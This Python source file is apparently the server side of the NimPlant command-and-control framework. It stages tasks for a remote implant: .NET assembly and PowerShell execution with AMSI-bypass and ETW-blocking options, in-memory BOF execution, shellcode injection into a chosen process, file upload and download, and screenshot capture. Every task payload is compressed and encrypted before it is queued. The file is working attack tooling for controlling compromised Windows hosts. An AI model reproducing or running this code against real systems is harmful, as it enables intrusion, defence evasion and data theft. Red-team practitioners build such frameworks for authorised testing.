import os
import src.util.time as utils_time
from datetime import datetime
from struct import pack, calcsize
from gzip import decompress
from flask import Request
from time import sleep
from typing import Optional, IO
from zlib import compress
import src.servers.admin_api.commands.commands_parser as commands_parser
import src.servers.admin_api.models.nimplant_listener_model as listener
from src.servers.admin_api.models.nimplant_client_model import NimPlant
from src.util.crypto import encrypt_data
from src.servers.admin_api.commands.misc.beacon_pack import BeaconPack
import src.util.utils as utils
import base64
import binascii
import hashlib

# Clear screen
def cls():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

# Help menu function
def get_help_menu():
    res = "\n=== IMPLANT HELP ===\n"
    res += (
        "Command arguments shown as [required] <optional>.\n"
        "Commands with (GUI) can be run without parameters via the web UI.\n\n"
    )
    for c in commands_parser.get_commands():
        res += f"{c['command']:<18}{c['description']:<75}\n"
    res += "\n=== END OF IMPLANT HELP ===\n\n"
    return res.rstrip()


# Print the help text for a specific command
def get_command_help(command):
    c = [c for c in commands_parser.get_commands() if c["command"] == command]

    if not c:
        return "Help: Command not found."

    c = c[0]

    res = "\n=== IMPLANT HELP ===\n"
    res += f"{c['command']} {c['description']}\n\n"
    res += c["help"]
    res += "\n=== END OF IMPLANT HELP ===\n\n"

    return res.rstrip()


# Handle pre-processing for the 'execute-assembly' command
def execute_assembly(np: NimPlant, args, raw_command):
    # TODO: Make AMSI/ETW arg parsing more user-friendly
    amsi = "1"
    etw = "1"

    k = 0
    for i in range(len(args)):
        if args[i].startswith("BYPASSAMSI"):
            amsi = args[i].split("=")[-1]
            k += 1
        if args[i].startswith("BLOCKETW"):
            etw = args[i].split("=")[-1]
            k += 1

    try:
        file = args[k]
    except IndexError:
        utils.nimplant_print(
            "Invalid number of arguments received. Usage: 'execute-assembly <BYPASSAMSI=0> <BLOCKETW=0> [localfilepath] <arguments>'.",
            np.guid,
            raw_command,
        )
        return

    # Check if assembly is provided as file path (normal use), GUI use is handled via API
    assembly = None
    try:
        if os.path.isfile(file):
            with open(file, "rb") as f:
                assembly = f.read()
        else:
            raise FileNotFoundError
    except:
        utils.nimplant_print(
            "Invalid assembly file specified.",
            np.guid,
            raw_command,
        )
        return

    assembly = compress(assembly, level=9)
    assembly = encrypt_data(assembly, np.encryption_key)
    assembly_arguments = " ".join(args[k + 1 :])

    command = list(["execute-assembly", amsi, etw, assembly, assembly_arguments])

    guid = np.add_task(command, task_friendly=raw_command)
    utils.nimplant_print(
        "Staged execute-assembly command for Implant.", np.guid, task_guid=guid
    )


# Handle pre-processing for the 'inline-execute' command
def inline_execute(np: NimPlant, args, raw_command):
    try:
        file = args[0]
        entry_point = args[1]
        assembly_arguments = list(args[2:])
    except:
        utils.nimplant_print(
            "Invalid number of arguments received.\nUsage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.",
            np.guid,
            raw_command,
        )
        return

    # Check if BOF file path is provided correctly
    if os.path.isfile(file):
        with open(file, "rb") as f:
            assembly = f.read()
    else:
        utils.nimplant_print(
            "Invalid BOF file specified.",
            np.guid,
            raw_command,
        )
        return

    assembly = compress(assembly, level=9)
    assembly = encrypt_data(assembly, np.encryption_key)

    # Pre-process BOF arguments
    # Check if list of arguments consists of argument-type pairs
    args_binary = ["binary", "bin", "b"]
    args_integer = ["integer", "int", "i"]
    args_short = ["short", "s"]
    args_string = ["string", "z"]
    args_wstring = ["wstring", "Z"]
    args_all = args_binary + args_integer + args_short + args_string + args_wstring

    if len(assembly_arguments) != 0:
        if not len(assembly_arguments) % 2 == 0:
            utils.nimplant_print(
                "BOF arguments not provided as arg-type pairs.\n"
                "Usage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.\n"
                "Example: 'inline-execute dir.x64.o go C:\\Users\\Testuser\\Desktop wstring'",
                np.guid,
                raw_command,
            )
            return

        # Pack every argument-type pair
        buffer = BeaconPack()
        arg_pair_list = zip(assembly_arguments[::2], assembly_arguments[1::2])
        for arg_pair in arg_pair_list:
            arg = arg_pair[0]
            argument_type = arg_pair[1]

            try:
                if argument_type in args_binary:
                    buffer.addbin(arg)
                elif argument_type in args_integer:
                    buffer.addint(int(arg))
                elif argument_type in args_short:
                    buffer.addshort(int(arg))
                elif argument_type in args_string:
                    buffer.addstr(arg)
                elif argument_type in args_wstring:
                    buffer.addWstr(arg)
                else:
                    utils.nimplant_print(
                        "Invalid argument type provided.\n"
                        f"Valid argument types (case-sensitive): {', '.join(args_all)}.",
                        np.guid,
                        raw_command,
                    )
                    return

            except ValueError:
                utils.nimplant_print(
                    "Invalid integer or short value provided.\nUsage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.\n"
                    "Example: 'inline-execute createremotethread.x64.o go 1337 i [b64shellcode] b'",
                    np.guid,
                    raw_command,
                )
                return

        assembly_args_final = str(binascii.hexlify(buffer.getbuffer()), "utf-8")
    else:
        assembly_args_final = ""

    command = list(["inline-execute", assembly, entry_point, assembly_args_final])

    guid = np.add_task(command, task_friendly=raw_command)
    utils.nimplant_print(
        "Staged inline-execute command for Implant.", np.guid, task_guid=guid
    )

    # Handle pre-processing for the 'powershell' command
def powershell(np: NimPlant, args, raw_command):
    amsi = "1"
    etw = "1"

    k = 0
    for i in range(len(args)):
        if args[i].startswith("BYPASSAMSI"):
            amsi = args[i].split("=")[-1]
            k += 1
        if args[i].startswith("BLOCKETW"):
            etw = args[i].split("=")[-1]
            k += 1

    powershell_cmd = " ".join(args[k:])

    if powershell_cmd == "":
        utils.nimplant_print(
            "Invalid number of arguments received. Usage: 'powershell <BYPASSAMSI=0> <BLOCKETW=0> [command]'.",
            np.guid,
            raw_command,
        )
        return

    command = list(["powershell", amsi, etw, powershell_cmd])

    guid = np.add_task(command, task_friendly=raw_command)
    utils.nimplant_print("Staged powershell command for Implant.", np.guid, task_guid=guid)


# Handle pre-processing for the 'shinject' command
def shinject(np: NimPlant, args, raw_command):
    try:
        process_id, file_path = args[0:2]
    except:
        utils.nimplant_print(
            "Invalid number of arguments received. Usage: 'shinject [PID] [localfilepath]'.",
            np.guid,
            raw_command,
        )
        return

    if os.path.isfile(file_path):
        with open(file_path, "rb") as f:
            shellcode = f.read()

        shellcode = compress(shellcode, level=9)
        shellcode = encrypt_data(shellcode, np.encryption_key)

        command = list(["shinject", process_id, shellcode])

        guid = np.add_task(command, task_friendly=raw_command)
        utils.nimplant_print("Staged shinject command for Implant.", np.guid, task_guid=guid)

    else:
        utils.nimplant_print(
            "Shellcode file to inject does not exist.",
            np.guid,
            raw_command,
        )


# Handle pre-processing for the 'upload' command
def upload_file(np: NimPlant, args, raw_command):
    # Debugging: Print received arguments in detail
    print(f"UPLOAD DEBUG: Raw command: '{raw_command}'")
    print(f"UPLOAD DEBUG: Args length: {len(args)}")
    print(f"UPLOAD DEBUG: Args content: {args}")
    
    if len(args) == 1:
        # If only one argument is provided, it should be either:
        # 1. A file path (legacy behavior) - we'll calculate the hash
        # 2. A hash directly (new behavior from web UI) - we'll use it directly
        
        file_id = args[0]
        remote_path = ""  # The implant will use the same file name
        
        # Check if this looks like a MD5 hash (32 hex chars)
        if len(file_id) == 32 and all(c in "0123456789abcdef" for c in file_id.lower()):
            print(f"UPLOAD DEBUG: Received hash directly: {file_id}")
            # This is already a hash, no need to recalculate
            # But we need to ensure the file is hosted
            
            # Look through the uploads folder to find the matching file
            uploads_path = os.path.abspath(f"server/uploads/server-{listener.np_server.guid}")
            file_found = False
            
            if os.path.exists(uploads_path):
                for root, dirs, files in os.walk(uploads_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if hashlib.md5(file_path.encode("UTF-8")).hexdigest() == file_id:
                            file_found = True
                            np.host_file(file_path)
                            print(f"UPLOAD DEBUG: Found file for hash {file_id}: {file_path}")
                            break
                    if file_found:
                        break
            
            if not file_found:
                print(f"UPLOAD DEBUG: No file found for hash {file_id}")
        else:
            # Legacy behavior: calculate hash from file path
            file_path = file_id
            file_id = hashlib.md5(file_path.encode("UTF-8")).hexdigest()
            print(f"UPLOAD DEBUG: Single arg mode (legacy) - file_path: '{file_path}', hash: '{file_id}'")
            
            if os.path.isfile(file_path):
                np.host_file(file_path)
            else:
                utils.nimplant_print("File to upload does not exist.", np.guid, raw_command)
                return
    elif len(args) == 2:
        # Two arguments: either file_path + remote_path OR hash + remote_path
        arg1 = args[0]
        remote_path = args[1]
        
        # Check if first arg looks like a MD5 hash
        if len(arg1) == 32 and all(c in "0123456789abcdef" for c in arg1.lower()):
            file_id = arg1
            print(f"UPLOAD DEBUG: Two args mode with hash - hash: '{file_id}', remote_path: '{remote_path}'")
            
            # Look through the uploads folder to find the matching file
            uploads_path = os.path.abspath(f"server/uploads/server-{listener.np_server.guid}")
            file_found = False
            
            if os.path.exists(uploads_path):
                for root, dirs, files in os.walk(uploads_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if hashlib.md5(file_path.encode("UTF-8")).hexdigest() == file_id:
                            file_found = True
                            np.host_file(file_path)
                            print(f"UPLOAD DEBUG: Found file for hash {file_id}: {file_path}")
                            break
                    if file_found:
                        break
            
            if not file_found:
                print(f"UPLOAD DEBUG: No file found for hash {file_id}")
        else:
            # Legacy behavior: first arg is file path
            file_path = arg1
            file_id = hashlib.md5(file_path.encode("UTF-8")).hexdigest()
            print(f"UPLOAD DEBUG: Two args mode (legacy) - file_path: '{file_path}', remote_path: '{remote_path}'")
            
            if os.path.isfile(file_path):
                np.host_file(file_path)
            else:
                utils.nimplant_print("File to upload does not exist.", np.guid, raw_command)
                return
    else:
        print(f"UPLOAD DEBUG: Invalid args count: {len(args)}")
        utils.nimplant_print(
            "Invalid number of arguments received. Usage: 'upload [local file or hash] <optional: remote destination path>'.",
            np.guid,
            raw_command,
        )
        return

    # Prepare the final command to send to the implant
    if remote_path == "":
        command = list(["upload", file_id])
        print(f"UPLOAD DEBUG: Sending command to implant: ['upload', '{file_id}']")
    else:
        # If a filename is needed (for the implant to download), extract it from the file path
        if np.hosting_file:
            file_name = os.path.basename(np.hosting_file)
            command = list(["upload", file_id, file_name, remote_path])
            print(f"UPLOAD DEBUG: Sending command to implant: ['upload', '{file_id}', '{file_name}', '{remote_path}']")
        else:
            # This shouldn't happen normally
            print(f"UPLOAD DEBUG: No hosting file found, using generic filename")
            command = list(["upload", file_id, "file", remote_path])

    guid = np.add_task(command, task_friendly=raw_command)
    utils.nimplant_print("Staged upload command for Implant.", np.guid, task_guid=guid)


# Handle pre-processing for the 'download' command
def download_file(np: NimPlant, args, raw_command):
    if len(args) == 1:
        file_path = args[0]
        file_name = file_path.replace("/", "\\").split("\\")[-1]
        local_path = (
            f"downloads/server-{listener.np_server.guid}/nimplant-{np.guid}/{file_name}"
        )
    elif len(args) == 2:
        file_path = args[0]
        local_path = args[1]
    else:
        utils.nimplant_print(
            "Invalid number of arguments received. Usage: 'download [remote file] <optional: local destination path>'.",
            np.guid,
            raw_command,
        )
        return

    os.makedirs(os.path.dirname(local_path), exist_ok=True)
    np.receive_file(local_path)
    command = list(["download", file_path])

    guid = np.add_task(command, task_friendly=raw_command)
    utils.nimplant_print("Staged download command for Implant.", np.guid, task_guid=guid)


# Handle post-processing of the 'screenshot' command
# This function is called based on the blob header b64(gzip(screenshot)), so we don't need to verify the format
def process_screenshot(np: NimPlant, sc_blob) -> str:
    sc_blob = decompress(base64.b64decode(sc_blob))

    path = f"downloads/server-{listener.np_server.guid}/nimplant-{np.guid}/screenshot_{utils_time.timestamp(filename_safe=True)}.png"
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as f:
        f.write(sc_blob)

    return f"Screenshot saved to '{path}'."

